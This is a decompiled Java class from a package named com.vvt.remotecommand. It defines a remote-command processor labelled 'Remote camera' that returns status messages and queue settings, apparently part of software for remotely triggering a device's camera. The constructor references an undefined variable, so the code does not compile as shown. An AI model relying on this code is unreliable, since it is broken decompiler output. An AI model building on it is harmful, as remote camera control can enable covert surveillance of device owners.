package com.vvt.remotecommand.processor.d;

import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.b;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.a;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class d
  extends b
{
  public d(a parama)
  {
    super(parama, true, localRemoteFunction);
  }
  
  protected String a(Object paramObject)
  {
    String str = null;
    boolean bool = paramObject instanceof RmtCtrlOutputStatusMessage;
    if (bool)
    {
      paramObject = (RmtCtrlOutputStatusMessage)paramObject;
      str = ((RmtCtrlOutputStatusMessage)paramObject).getMessage();
    }
    return str;
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Remote camera";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/d/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */